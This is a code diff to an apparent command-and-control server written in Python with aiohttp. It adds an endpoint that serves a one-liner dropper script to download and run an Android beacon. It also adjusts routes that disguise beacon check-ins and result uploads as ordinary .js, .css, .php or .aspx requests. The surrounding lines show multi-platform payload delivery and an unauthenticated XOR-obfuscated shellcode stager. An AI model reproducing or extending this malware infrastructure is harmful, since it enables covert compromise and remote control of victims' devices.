@@ -211,6 +211,22 @@ async def handle_payload(request: web.Request) -> web.Response:
         return web.Response(status=500)
 
 
+async def handle_android_stager(request: web.Request) -> web.Response:
+    """GET /s/android — Returns a one-liner shell script to download and run the Android beacon."""
+    try:
+        from phantom.utils.builder import generate_dropper
+        host = server_instance.host if server_instance.host != "0.0.0.0" else request.headers.get("Host", request.url.host)
+        if ":" in host:
+            host = host.split(":")[0]
+        port = server_instance.port or request.url.port or 80
+        use_ssl = request.scheme == "https"
+        script = generate_dropper("android", host, port, use_ssl=use_ssl)
+        return web.Response(text=script, content_type="text/plain")
+    except Exception as e:
+        logger.error(f"Android stager error: {e}")
+        return web.Response(status=500)
+
+
 async def handle_payload_pic(request: web.Request) -> web.Response:
     """GET /x — Serves the XOR-encrypted beacon.bin (PIC shellcode).
     No auth required — the payload is XOR-obfuscated with a static key
@@ -325,17 +341,17 @@ class C2Server:
         # Check-in: Support malleable URIs
         app.router.add_get("/api/v1/ping", handle_checkin)
         app.router.add_post("/api/v1/ping", handle_checkin)
-        app.router.add_get("/{path:.*\.js}", handle_checkin)
-        app.router.add_post("/{path:.*\.js}", handle_checkin)
-        app.router.add_get("/{path:.*\.css}", handle_checkin)
-        app.router.add_post("/{path:.*\.css}", handle_checkin)
-        app.router.add_get("/{path:.*\.ico}", handle_checkin)
-        app.router.add_post("/{path:.*\.ico}", handle_checkin)
+        app.router.add_get(r"/{path:.*\.js}", handle_checkin)
+        app.router.add_post(r"/{path:.*\.js}", handle_checkin)
+        app.router.add_get(r"/{path:.*\.css}", handle_checkin)
+        app.router.add_post(r"/{path:.*\.css}", handle_checkin)
+        app.router.add_get(r"/{path:.*\.ico}", handle_checkin)
+        app.router.add_post(r"/{path:.*\.ico}", handle_checkin)
         
         # Results
         app.router.add_post("/api/v1/result", handle_result)
-        app.router.add_post("/{path:.*\.php}", handle_result)
-        app.router.add_post("/{path:.*\.aspx}", handle_result)
+        app.router.add_post(r"/{path:.*\.php}", handle_result)
+        app.router.add_post(r"/{path:.*\.aspx}", handle_result)
         
         # Payload delivery
         app.router.add_get("/api/v1/payload", handle_payload)
@@ -343,8 +359,11 @@ class C2Server:
         app.router.add_get("/api/v1/payload_linux_x86", handle_payload)
         app.router.add_get("/api/v1/payload_macos", handle_payload)
         app.router.add_get("/api/v1/payload_android", handle_payload)
+        # One-liner platform stagers
+        app.router.add_get("/s/android", handle_android_stager)
         # Ultra-compact PIC stager endpoint (XOR-encrypted beacon.bin)
         app.router.add_get("/x", handle_payload_pic)
+        app.router.add_get("/", lambda r: web.Response(text="C2 OK"))
         return app
 
     def _start_server(self) -> None:
@@ -357,7 +376,7 @@ class C2Server:
         # Determine if we should use SSL
         self.ssl_context = self._get_ssl_context()
         
-        self.runner = web.AppRunner(self.app, access_log=None, client_max_size=50*1024*1024)
+        self.runner = web.AppRunner(self.app)
         self.loop.run_until_complete(self.runner.setup())
         
         # Fix: Always bind to 0.0.0.0 to avoid OSError 10049 if host is non-local
